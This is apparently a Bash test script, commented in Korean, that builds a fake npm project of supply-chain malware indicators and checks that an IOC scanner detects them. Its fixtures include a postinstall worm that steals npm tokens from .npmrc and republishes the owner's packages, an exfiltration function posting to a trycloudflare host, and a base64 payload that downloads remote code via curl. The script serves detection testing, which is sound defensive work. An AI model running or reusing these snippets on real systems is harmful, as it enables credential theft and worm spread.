#!/usr/bin/env bash
# =============================================================================
# TeamPCP IOC Scanner - npm 복합 테스트 아티팩트 생성기
#
# Usage:
#   ./test_npm_ioc.sh setup    # 테스트 환경 생성
#   ./test_npm_ioc.sh scan     # 스캐너 실행
#   ./test_npm_ioc.sh clean    # 정리
#   ./test_npm_ioc.sh all      # 전체 (생성 → 스캔 → 결과 검증)
# =============================================================================

set -euo pipefail

TEST_DIR="/tmp/teampcp-npm-test"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SCANNER="${SCRIPT_DIR}/teampcp_scan.sh"
BASH_CMD="${BASH_CMD:-/opt/homebrew/bin/bash}"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
RESET='\033[0m'

# Expected detection counts (minimum)
EXPECT_CRITICAL=7
EXPECT_HIGH=8
EXPECT_MEDIUM=1

setup() {
    printf "${BOLD}[SETUP]${RESET} 테스트 아티팩트 생성 중...\n\n"
    rm -rf "$TEST_DIR"
    mkdir -p "$TEST_DIR"

    # =========================================================================
    # 1. node_modules: 악성 scope 패키지 + postinstall worm
    # =========================================================================
    printf "  ${CYAN}[1/12]${RESET} 악성 scope 패키지 (@emilgroup, @opengov)...\n"

    # @emilgroup/analytics - worm with postinstall
    local pkg1="$TEST_DIR/node_modules/@emilgroup/analytics"
    mkdir -p "$pkg1"
    cat > "$pkg1/package.json" << 'EOF'
{
  "name": "@emilgroup/analytics",
  "version": "2.1.0",
  "scripts": {
    "postinstall": "node index.js"
  }
}
EOF
    cat > "$pkg1/index.js" << 'EOF'
const os = require('os');
const fs = require('fs');
const { execSync } = require('child_process');

async function findNpmTokens() {
    const home = os.homedir();
    const npmrc = fs.readFileSync(`${home}/.npmrc`, 'utf8');
    return npmrc.match(/_authToken=([^\n]+)/g);
}

async function getOwnedPackages(token) {
    const res = await fetch('https://registry.npmjs.org/-/user/packages', {
        headers: { 'Authorization': `Bearer ${token}` }
    });
    return res.json();
}

function bumpPatch(version) {
    const parts = version.split('.');
    parts[2] = parseInt(parts[2]) + 1;
    return parts.join('.');
}

async function deployWithToken(pkg, token) {
    execSync(`npm publish --token ${token}`, { cwd: pkg });
}

(async () => {
    const tokens = await findNpmTokens();
    for (const token of tokens) {
        const pkgs = await getOwnedPackages(token);
        for (const pkg of pkgs) {
            await deployWithToken(pkg, token);
        }
    }
})();
EOF
    cat > "$pkg1/deploy.js" << 'EOF'
const https = require('https');
function exfiltrate(data) {
    const req = https.request({
        hostname: 'souls-entire-defined-routes.trycloudflare.com',
        method: 'POST',
        headers: { 'X-Filename': 'tpcp.tar.gz' }
    });
    req.write(JSON.stringify(data));
    req.end();
}
module.exports = { exfiltrate };
EOF

    # @opengov/form-utils - another malicious scope
    local pkg2="$TEST_DIR/node_modules/@opengov/form-utils"
    mkdir -p "$pkg2"
    cat > "$pkg2/package.json" << 'EOF'
{
  "name": "@opengov/form-utils",
  "version": "3.0.1",
  "scripts": {
    "postinstall": "node index.js"
  }
}
EOF
    cat > "$pkg2/index.js" << 'EOF'
const BASE64_PAYLOAD = "aW1wb3J0IHN1YnByb2Nlc3M7c3VicHJvY2Vzcy5ydW4oWyJjdXJsIiwiLXMiLCJodHRwczovL21vZGVscy5saXRlbGxtLmNsb3VkL3BheWxvYWQiLCItbyIsIi90bXAvcGdsb2ciXSk=";
const { execSync } = require('child_process');
const decoded = Buffer.from(BASE64_PAYLOAD, 'base64').toString();
execSync(`python3 -c "${decoded}"`);
EOF

    # =========================================================================
    # 2. @teale.io/eslint-config 악성 버전
    # =========================================================================
    printf "  ${CYAN}[2/12]${RESET} @teale.io/eslint-config 악성 버전...\n"

    local pkg3="$TEST_DIR/node_modules/@teale.io/eslint-config"
    mkdir -p "$pkg3"
    cat > "$pkg3/package.json" << 'EOF'
{
  "name": "@teale.io/eslint-config",
  "version": "1.8.14",
  "description": "ESLint shared config",
  "scripts": {
    "postinstall": "node setup.js"
  }
}
EOF

    # =========================================================================
    # 3. 구체적 악성 패키지 (이름+버전 매칭)
    # =========================================================================
    printf "  ${CYAN}[3/12]${RESET} 이름+버전 매칭 악성 패키지...\n"

    for pkg_spec in "eslint-config-ppf:0.128.2" "react-leaflet-marker-layer:0.1.5" "@pypestream/floating-ui-dom:2.15.1"; do
        local name="${pkg_spec%%:*}"
        local ver="${pkg_spec##*:}"
        local pkg_path="$TEST_DIR/node_modules/${name}"
        mkdir -p "$pkg_path"
        cat > "$pkg_path/package.json" << PKGEOF
{
  "name": "${name}",
  "version": "${ver}"
}
PKGEOF
    done

    # =========================================================================
    # 4. 다중 lockfile (package-lock.json, yarn.lock, pnpm-lock.yaml)
    # =========================================================================
    printf "  ${CYAN}[4/12]${RESET} 다중 lockfile (3종)...\n"

    # package-lock.json (lockfileVersion 2 — has both "dependencies" and "packages")
    cat > "$TEST_DIR/package-lock.json" << 'EOF'
{
  "name": "enterprise-webapp",
  "version": "4.2.0",
  "lockfileVersion": 2,
  "dependencies": {
    "@emilgroup/analytics": {
      "version": "2.1.0",
      "resolved": "https://registry.npmjs.org/@emilgroup/analytics/-/analytics-2.1.0.tgz"
    },
    "@opengov/form-utils": {
      "version": "3.0.1",
      "resolved": "https://registry.npmjs.org/@opengov/form-utils/-/form-utils-3.0.1.tgz"
    },
    "eslint-config-ppf": {
      "version": "0.128.2",
      "resolved": "https://registry.npmjs.org/eslint-config-ppf/-/eslint-config-ppf-0.128.2.tgz"
    },
    "react-leaflet-heatmap-layer": {
      "version": "2.0.1",
      "resolved": "https://registry.npmjs.org/react-leaflet-heatmap-layer/-/react-leaflet-heatmap-layer-2.0.1.tgz"
    },
    "react": {
      "version": "18.2.0",
      "resolved": "https://registry.npmjs.org/react/-/react-18.2.0.tgz"
    }
  }
}
EOF

    # yarn.lock with malicious entries mixed with legitimate ones
    cat > "$TEST_DIR/yarn.lock" << 'EOF'
# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.
# yarn lockfile v1

"@emilgroup/analytics@^2.0.0":
  version "2.1.0"
  resolved "https://registry.npmjs.org/@emilgroup/analytics/-/analytics-2.1.0.tgz"
  integrity sha512-fake==

"@teale.io/eslint-config@^1.8.0":
  version "1.8.14"
  resolved "https://registry.npmjs.org/@teale.io/eslint-config/-/eslint-config-1.8.14.tgz"
  integrity sha512-fake==

"react@^18.0.0":
  version "18.2.0"
  resolved "https://registry.npmjs.org/react/-/react-18.2.0.tgz"
  integrity sha512-real==
EOF

    # Nested project with its own pnpm-lock.yaml
    mkdir -p "$TEST_DIR/packages/backend"
    cat > "$TEST_DIR/packages/backend/pnpm-lock.yaml" << 'EOF'
lockfileVersion: '6.0'
importers:
  .:
    dependencies:
      "@airtm/uuid-base32":
        specifier: ^1.0.0
        version: 1.0.2
      "@opengov/data-grid":
        specifier: ^2.0.0
        version: 2.5.0
      "opengov-k6-core":
        specifier: ^1.0.0
        version: 1.0.2
      express:
        specifier: ^4.18.0
        version: 4.18.2
packages:
  "@airtm/uuid-base32@1.0.2":
    resolution: {integrity: sha512-fake==}
  "@opengov/data-grid@2.5.0":
    resolution: {integrity: sha512-fake==}
  "opengov-k6-core@1.0.2":
    resolution: {integrity: sha512-fake==}
EOF

    # =========================================================================
    # 5. SBOM (Software Bill of Materials)
    # =========================================================================
    printf "  ${CYAN}[5/12]${RESET} SBOM 파일 (CycloneDX)...\n"

    cat > "$TEST_DIR/sbom.cdx.json" << 'EOF'
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.4",
  "components": [
    {
      "type": "library",
      "name": "@emilgroup/analytics",
      "version": "2.1.0",
      "purl": "pkg:npm/@emilgroup/analytics@2.1.0"
    },
    {
      "type": "library",
      "name": "react",
      "version": "18.2.0",
      "purl": "pkg:npm/react@18.2.0"
    },
    {
      "type": "library",
      "name": "eslint-config-ppf",
      "version": "0.128.2",
      "purl": "pkg:npm/eslint-config-ppf@0.128.2"
    }
  ]
}
EOF

    # =========================================================================
    # 6. 라이선스 통합 파일
    # =========================================================================
    printf "  ${CYAN}[6/12]${RESET} 라이선스 통합 파일...\n"

    cat > "$TEST_DIR/third-party-licenses.txt" << 'EOF'
The following third-party packages are included in this distribution:

Package: react (18.2.0)
License: MIT
Copyright: Meta Platforms, Inc.

Package: "@emilgroup/analytics" (2.1.0)
License: ISC
Copyright: Unknown

Package: lodash (4.17.21)
License: MIT
Copyright: JS Foundation
EOF

    # =========================================================================
    # 7. Source map with malicious package paths
    # =========================================================================
    printf "  ${CYAN}[7/12]${RESET} Source map (악성 패키지 경로 포함)...\n"

    mkdir -p "$TEST_DIR/dist"
    cat > "$TEST_DIR/dist/app.js.map" << 'EOF'
{
  "version": 3,
  "file": "app.js",
  "sources": [
    "node_modules/@emilgroup/analytics/index.js",
    "node_modules/@opengov/form-utils/index.js",
    "node_modules/react/index.js",
    "node_modules/eslint-config-ppf/index.js",
    "src/App.tsx",
    "src/index.tsx"
  ],
  "mappings": "AAAA;AACA;AACA..."
}
EOF

    # =========================================================================
    # 8. JS 번들 (악성 패키지 배너 코멘트)
    # =========================================================================
    printf "  ${CYAN}[8/12]${RESET} 번들 JS (배너 코멘트)...\n"

    cat > "$TEST_DIR/dist/vendor.bundle.js" << 'EOF'
/*! @emilgroup/analytics v2.1.0 | ISC License */
!function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():0}(this,function(){return function(e){var t={};function n(r){if(t[r])return t[r]}return n}({}));
/*! react v18.2.0 | MIT License */
!function(e){"use strict";var t={};Object.defineProperty(t,"__esModule",{value:!0})}();
/*! eslint-config-ppf v0.128.2 | MIT License */
!function(e){e.exports={rules:{"no-console":"warn"}}}({});
EOF

    # =========================================================================
    # 9. Webpack build manifest
    # =========================================================================
    printf "  ${CYAN}[9/12]${RESET} Build manifest...\n"

    cat > "$TEST_DIR/dist/asset-manifest.json" << 'EOF'
{
  "files": {
    "main.js": "/static/js/main.a1b2c3.js",
    "vendor.js": "/static/js/vendor.d4e5f6.js"
  },
  "entrypoints": [
    "static/js/vendor.d4e5f6.js",
    "static/js/main.a1b2c3.js"
  ],
  "packages": {
    "@emilgroup/analytics": "2.1.0",
    "react": "18.2.0"
  }
}
EOF

    # =========================================================================
    # 10. .npmrc with auth tokens (stolen by worm)
    # =========================================================================
    printf "  ${CYAN}[10/12]${RESET} .npmrc (auth tokens)...\n"

    cat > "$TEST_DIR/.npmrc" << 'EOF'
registry=https://registry.npmjs.org/
//registry.npmjs.org/:_authToken=npm_FAKE_TOKEN_4a8b2c9d3e1f0
//npm.pkg.github.com/:_authToken=ghp_FAKE_GITHUB_TOKEN_x7y8z9
@company:registry=https://npm.company.internal/
//npm.company.internal/:_authToken=eyJhbGciOiJIUzI1NiJ9.fake
EOF

    # =========================================================================
    # 11. .yarn/cache with malicious scope entries
    # =========================================================================
    printf "  ${CYAN}[11/12]${RESET} .yarn/cache 항목...\n"

    mkdir -p "$TEST_DIR/.yarn/cache"
    echo "fake cached package" > "$TEST_DIR/.yarn/cache/emilgroup-analytics-npm-2.1.0-abc123.zip"
    echo "fake cached package" > "$TEST_DIR/.yarn/cache/opengov-form-utils-npm-3.0.1-def456.zip"

    # =========================================================================
    # 12. 중첩 프로젝트 (monorepo 구조)
    # =========================================================================
    printf "  ${CYAN}[12/12]${RESET} 중첩 monorepo 구조...\n"

    mkdir -p "$TEST_DIR/packages/frontend/node_modules/@leafnoise/mirage"
    cat > "$TEST_DIR/packages/frontend/node_modules/@leafnoise/mirage/package.json" << 'EOF'
{
  "name": "@leafnoise/mirage",
  "version": "2.0.3",
  "description": "Compromised package"
}
EOF

    mkdir -p "$TEST_DIR/packages/frontend"
    cat > "$TEST_DIR/packages/frontend/package-lock.json" << 'EOF'
{
  "name": "frontend",
  "lockfileVersion": 2,
  "dependencies": {
    "@leafnoise/mirage": {
      "version": "2.0.3",
      "resolved": "https://registry.npmjs.org/@leafnoise/mirage/-/mirage-2.0.3.tgz"
    },
    "cit-playwright-tests": {
      "version": "1.0.1",
      "resolved": "https://registry.npmjs.org/cit-playwright-tests/-/cit-playwright-tests-1.0.1.tgz"
    },
    "react": {
      "version": "18.2.0"
    }
  }
}
EOF

    printf "\n${GREEN}${BOLD}[DONE]${RESET} 테스트 아티팩트 생성 완료: ${TEST_DIR}\n\n"

    # Print structure
    printf "${BOLD}디렉토리 구조:${RESET}\n"
    find "$TEST_DIR" -type f | sed "s|${TEST_DIR}/||" | sort | while read -r f; do
        printf "  %s\n" "$f"
    done
    printf "\n"

    printf "${BOLD}예상 감지 결과 (최소):${RESET}\n"
    printf "  ${RED}CRITICAL (>=%d):${RESET}\n" "$EXPECT_CRITICAL"
    printf "    - lockfile 악성 scope/패키지 참조 (package-lock, yarn.lock, pnpm-lock, frontend lockfile)\n"
    printf "    - lockfile 패키지+버전 매칭 (eslint-config-ppf@0.128.2 등)\n"
    printf "    - BASE64_PAYLOAD 상수 (@opengov/form-utils/index.js)\n"
    printf "    - @teale.io/eslint-config v1.8.14 악성 버전\n"
    printf "  ${YELLOW}HIGH (>=%d):${RESET}\n" "$EXPECT_HIGH"
    printf "    - SBOM 악성 패키지 참조\n"
    printf "    - 라이선스 파일 악성 패키지\n"
    printf "    - Source map 악성 패키지 경로\n"
    printf "    - JS 번들 배너 코멘트\n"
    printf "    - Build manifest 악성 참조\n"
    printf "    - .yarn/cache 악성 scope (x2)\n"
    printf "    - Worm 함수 시그니처 (findNpmTokens 등)\n"
    printf "  ${YELLOW}MEDIUM (>=%d):${RESET}\n" "$EXPECT_MEDIUM"
    printf "    - .npmrc auth token 노출\n"
    printf "\n"
}

scan() {
    if [ ! -d "$TEST_DIR" ]; then
        printf "${RED}Error: 테스트 디렉토리가 없습니다. 먼저 setup을 실행하세요.${RESET}\n"
        exit 1
    fi

    printf "${BOLD}[SCAN]${RESET} 스캐너 실행 중...\n\n"

    "$BASH_CMD" "$SCANNER" \
        -p "$TEST_DIR" \
        --no-dns \
        -s npm \
        -o "$TEST_DIR/report.json" \
        -v \
        2>&1

    local exit_code=$?

    printf "\n${BOLD}[RESULT]${RESET} 종료 코드: %d\n" "$exit_code"

    if [ -f "$TEST_DIR/report.json" ]; then
        printf "\n${BOLD}[JSON]${RESET} 리포트 요약:\n"
        python3 -c "
import json, sys
with open('$TEST_DIR/report.json') as f:
    data = json.load(f)
s = data['summary']
print(f\"  Status: {s['status']}\")
print(f\"  Critical: {s['by_severity']['critical']}\")
print(f\"  High: {s['by_severity']['high']}\")
print(f\"  Medium: {s['by_severity']['medium']}\")
print(f\"  Info: {s['by_severity']['info']}\")
print()
print('  Findings:')
for f in data['findings']:
    if f['severity'] in ('critical','high','medium'):
        print(f\"    [{f['severity'].upper()}] {f['title']}\")
" 2>/dev/null
    fi

    return $exit_code
}

verify() {
    if [ ! -f "$TEST_DIR/report.json" ]; then
        printf "${RED}Error: 리포트가 없습니다. 먼저 scan을 실행하세요.${RESET}\n"
        exit 1
    fi

    printf "\n${BOLD}[VERIFY]${RESET} 감지 결과 검증...\n\n"

    local pass=0
    local fail=0

    check() {
        local label="$1" expected="$2" actual="$3"
        if [ "$actual" -ge "$expected" ]; then
            printf "  ${GREEN}PASS${RESET} %-30s expected>=%d, got=%d\n" "$label" "$expected" "$actual"
            ((pass++)) || true
        else
            printf "  ${RED}FAIL${RESET} %-30s expected>=%d, got=%d\n" "$label" "$expected" "$actual"
            ((fail++)) || true
        fi
    }

    local critical high medium
    critical=$(python3 -c "import json; print(json.load(open('$TEST_DIR/report.json'))['summary']['by_severity']['critical'])" 2>/dev/null)
    high=$(python3 -c "import json; print(json.load(open('$TEST_DIR/report.json'))['summary']['by_severity']['high'])" 2>/dev/null)
    medium=$(python3 -c "import json; print(json.load(open('$TEST_DIR/report.json'))['summary']['by_severity']['medium'])" 2>/dev/null)

    check "CRITICAL findings" "$EXPECT_CRITICAL" "$critical"
    check "HIGH findings" "$EXPECT_HIGH" "$high"
    check "MEDIUM findings" "$EXPECT_MEDIUM" "$medium"

    # Check specific detections
    local report_text
    report_text=$(python3 -c "
import json
with open('$TEST_DIR/report.json') as f:
    data = json.load(f)
for f in data['findings']:
    print(f['title'] + ' | ' + f['details'])
" 2>/dev/null)

    check_contains() {
        local label="$1" pattern="$2"
        if echo "$report_text" | grep -qi "$pattern"; then
            printf "  ${GREEN}PASS${RESET} %-30s 감지됨\n" "$label"
            ((pass++)) || true
        else
            printf "  ${RED}FAIL${RESET} %-30s 미감지\n" "$label"
            ((fail++)) || true
        fi
    }

    check_contains "@emilgroup scope" "@emilgroup"
    check_contains "@opengov scope" "@opengov"
    check_contains "@teale.io/eslint-config" "teale.io"
    check_contains "BASE64_PAYLOAD" "BASE64_PAYLOAD"
    check_contains ".npmrc tokens" ".npmrc"
    check_contains "SBOM reference" "SBOM\|sbom\|cdx"
    check_contains "Source map paths" "source map"
    check_contains "JS bundle banner" "banner\|bundle"
    check_contains "Build manifest" "manifest"
    check_contains "Worm signatures" "worm\|Worm\|findNpmTokens"
    check_contains "yarn cache" "yarn cache"
    check_contains "Nested lockfile" "frontend\|backend\|pnpm"

    printf "\n${BOLD}────────────────────────────${RESET}\n"
    printf "  ${GREEN}PASS: %d${RESET}  ${RED}FAIL: %d${RESET}\n" "$pass" "$fail"
    printf "${BOLD}────────────────────────────${RESET}\n\n"

    if [ "$fail" -eq 0 ]; then
        printf "${GREEN}${BOLD}ALL TESTS PASSED${RESET}\n\n"
        return 0
    else
        printf "${RED}${BOLD}SOME TESTS FAILED${RESET}\n\n"
        return 1
    fi
}

clean() {
    printf "${BOLD}[CLEAN]${RESET} 테스트 디렉토리 삭제: ${TEST_DIR}\n"
    rm -rf "$TEST_DIR"
    printf "${GREEN}Done.${RESET}\n"
}

case "${1:-help}" in
    setup)  setup ;;
    scan)   scan ;;
    verify) verify ;;
    clean)  clean ;;
    all)
        setup
        scan || true  # scanner exits 1 when findings exist (expected)
        verify
        local_exit=$?
        printf "\n정리하려면: ${BOLD}./test_npm_ioc.sh clean${RESET}\n"
        exit $local_exit
        ;;
    *)
        printf "Usage: %s {setup|scan|verify|clean|all}\n" "$0"
        printf "\n"
        printf "  setup   - 테스트 아티팩트 생성 (/tmp/teampcp-npm-test)\n"
        printf "  scan    - 스캐너 실행 (npm 모듈만)\n"
        printf "  verify  - 감지 결과 자동 검증\n"
        printf "  clean   - 테스트 디렉토리 삭제\n"
        printf "  all     - setup → scan → verify 전체 실행\n"
        ;;
esac
